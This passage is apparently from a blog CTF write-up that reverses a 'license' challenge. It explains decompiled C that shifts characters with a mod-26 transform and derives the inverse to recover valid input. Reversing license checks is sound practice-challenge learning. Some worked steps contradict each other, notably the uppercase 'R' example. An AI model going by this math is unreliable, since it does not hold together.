    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">local_c</span><span class="p">)</span> <span class="o">!=</span> <span class="s">"mzXaPLzR"</span><span class="p">[</span><span class="n">local_c</span><span class="p">])</span> <span class="k">break</span><span class="p">;</span>
    <span class="n">local_c</span> <span class="o">=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Here the remaining eight bytes are looped and for each byte if the character is upper case or lower case[the <code class="language-plaintext highlighter-rouge">__ctype_b_loc</code> and its <a href="https://stackoverflow.com/questions/37702434/ctype-b-loc-what-is-its-purpose">explanation</a> and its mapping <a href="https://ctftime.org/writeup/32308">here</a>] are determined by the <code class="language-plaintext highlighter-rouge">__ctype_b_loc</code>. The character if it is lower case performs</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Here the char is subtracted by 92</span>
<span class="n">inter_int</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x5c</span><span class="p">;</span>

<span class="c1">//Here the inter_int is performed modulus by 26 and added with 97 and typecasted into char</span>
<span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">inter_int</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">inter_int</span> <span class="o">/</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x1a</span> <span class="o">+</span> <span class="sc">'a'</span><span class="p">;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">(char)inter_int + (char)(inter_int / 0x1a) * -0x1a</code> is a operation which performs modulus 26 for a number. For example</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Lets take a inter_int as 12
</span><span class="mi">12</span> <span class="o">+</span> <span class="p">(</span><span class="mi">12</span> <span class="o">/</span> <span class="mi">26</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="mi">26</span><span class="p">)</span>
<span class="mi">12</span> <span class="o">+</span> <span class="mi">0</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="mi">26</span><span class="p">)</span>
<span class="mi">12</span> <span class="o">+</span> <span class="mi">0</span>
<span class="mi">12</span> <span class="c1">#which is 12 mod 26
</span>
<span class="c1"># Another example where inten_int as 52
</span><span class="mi">52</span> <span class="o">+</span> <span class="p">(</span><span class="mi">52</span> <span class="o">/</span> <span class="mi">26</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="mi">26</span><span class="p">)</span>
<span class="mi">52</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="mi">26</span><span class="p">)</span>
<span class="mi">52</span> <span class="o">-</span> <span class="mi">52</span>
<span class="mi">0</span> <span class="c1"># which is 52 mod 26
</span></code></pre></div></div>

<p>So it can be reversed by</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">x</span> <span class="o">=</span> <span class="n">z</span> <span class="o">-</span> <span class="mi">92</span>
<span class="n">y</span> <span class="o">=</span> <span class="n">x</span> <span class="n">mod</span> <span class="mi">26</span> <span class="o">+</span> <span class="mi">97</span>
<span class="c1"># where y is result chars and x is inter_int and z should be found
</span><span class="n">x</span> <span class="n">mod</span> <span class="mi">26</span> <span class="o">=</span> <span class="n">y</span> <span class="o">-</span> <span class="mi">97</span>
<span class="c1"># So this means x is congruent to (y-90)
# For char 'a' y = 97
</span><span class="n">x</span> <span class="n">mod</span> <span class="mi">26</span> <span class="o">=</span> <span class="mi">0</span>
<span class="c1"># So x can be multiple of 26 of k times
</span><span class="n">x</span> <span class="o">=</span> <span class="mi">26</span> <span class="o">*</span> <span class="n">k</span>
<span class="c1"># Substituting x = (z-92)
</span><span class="n">z</span> <span class="o">-</span> <span class="mi">92</span> <span class="o">=</span> <span class="mi">26</span> <span class="o">*</span> <span class="n">k</span>
<span class="n">z</span> <span class="o">=</span> <span class="mi">26</span><span class="o">*</span><span class="n">k</span> <span class="o">+</span> <span class="mi">92</span>
<span class="c1"># where k can be 0,1,2,...
# if k = 0
</span><span class="n">z</span> <span class="o">=</span> <span class="mi">92</span>
<span class="c1"># if k = 1
</span><span class="n">z</span> <span class="o">=</span> <span class="mi">26</span> <span class="o">+</span> <span class="mi">92</span> <span class="o">=</span> <span class="mi">118</span>
<span class="c1"># chr(118) = 'v'
</span></code></pre></div></div>

<p>The entire lower case letter char can be reversed by above method. For upper case letter, the simplified equation is <code class="language-plaintext highlighter-rouge">(z - 48) mod 26 = y - 65</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># For y = 'R' 
</span><span class="n">z</span> <span class="o">-</span> <span class="mi">48</span> <span class="o">=</span> <span class="p">(</span><span class="mi">26</span><span class="o">*</span><span class="n">k</span><span class="p">)</span> <span class="o">+</span> <span class="mi">117</span>
<span class="n">z</span> <span class="o">=</span> <span class="p">(</span><span class="mi">26</span><span class="o">*</span><span class="n">K</span><span class="p">)</span> <span class="o">+</span> <span class="mi">65</span> 
<span class="n">z</span> <span class="o">=</span> <span class="mi">65</span> <span class="c1"># if k = 1 ,so solution for 'R' is 'A' 
</span></code></pre></div></div>

<p>Well I got this elegant solution from discord.</p>

<p><img src="../assets/2024/tfcctf/license2.png" alt="" /></p>

</article>
      </section>
    </div>
  </div>

   <footer>
  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
    <span>
        <b>grep-user</b>
    </span>
    
    <span>© 2024</span>
  </a>
</footer>

  
</body>

</html>